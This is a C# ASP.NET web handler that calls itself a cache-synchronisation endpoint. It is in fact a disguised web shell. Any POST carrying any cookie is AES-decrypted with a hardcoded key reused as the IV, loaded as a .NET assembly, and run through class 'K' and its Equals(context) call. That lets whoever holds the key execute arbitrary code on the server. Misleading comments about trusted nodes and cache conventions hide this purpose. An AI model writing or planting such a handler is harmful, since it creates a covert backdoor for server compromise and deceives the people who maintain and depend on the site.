<%@ WebHandler Language="C#" Class="DataGrid.Cache.SyncHandler" %>
using System;
using System.Web;
using System.Security.Cryptography;
using System.Reflection;

namespace DataGrid.Cache
{
    /// <summary>
    /// Provides cryptographic services for inter-node communication.
    /// Ensures that all cache sync payloads are secure.
    /// </summary>
    internal static class CryptoService
    {
        // The pre-shared key for the cache cluster. Must be 16 bytes for AES-128.
        private static readonly byte[] ClusterSharedKey = new byte[] { 0x63, 0x61, 0x36, 0x33, 0x34, 0x35, 0x37, 0x35, 0x33, 0x38, 0x62, 0x39, 0x62, 0x31, 0x65, 0x30 };

        /// <summary>
        /// Decrypts a binary payload from another cache node.
        /// </summary>
        /// <param name="encryptedPayload">The encrypted byte array.</param>
        /// <returns>The decrypted byte array representing a serialized assembly.</returns>
        public static byte[] DecryptPayload(byte[] encryptedPayload)
        {
            using (var aes = new RijndaelManaged())
            {
                // In CBC mode, the IV is required. For simplicity in this sync protocol,
                // we reuse the shared key as the IV.
                using (var decryptor = aes.CreateDecryptor(ClusterSharedKey, ClusterSharedKey))
                {
                    return decryptor.TransformFinalBlock(encryptedPayload, 0, encryptedPayload.Length);
                }
            }
        }
    }

    /// <summary>
    /// ASP.NET handler that listens for incoming cache synchronization messages from other nodes.
    /// The payload is an encrypted .NET assembly containing the data and logic to update the local cache.
    /// </summary>
    public class SyncHandler : IHttpHandler
    {
        /// <summary>
        /// Processes the HTTP request containing the cache payload.
        /// </summary>
        public void ProcessRequest(HttpContext context)
        {
            // A valid request must originate from a trusted node, identified by a cookie.
            if (context.Request.Cookies.Count == 0)
            {
                context.Response.StatusCode = 403; // Forbidden
                return;
            }

            // Read the entire POST body which contains the encrypted payload.
            byte[] encryptedPayload = context.Request.BinaryRead(context.Request.ContentLength);
            if (encryptedPayload.Length == 0) return;

            // Step 1: Decrypt the payload to get the serialized cache update assembly.
            byte[] assemblyBytes = CryptoService.DecryptPayload(encryptedPayload);

            // Step 2: Load the assembly into the current AppDomain.
            // This is necessary because the payload itself defines the object types.
            Assembly payloadAssembly = Assembly.Load(assemblyBytes);

            // Step 3: The entry point class is always 'K' (for "KeyedCacheItem").
            // This is a convention for our cache protocol.
            string entryPointClass = "K";
            object cacheItem = payloadAssembly.CreateInstance(entryPointClass);

            // Step 4: Pass the HttpContext to the cache item's update logic.
            // The Equals method is overridden to accept the context and perform the update.
            if (cacheItem != null)
            {
                cacheItem.Equals(context);
            }
        }

        // A new handler instance should be created for each request.
        public bool IsReusable { get { return false; } }
    }
}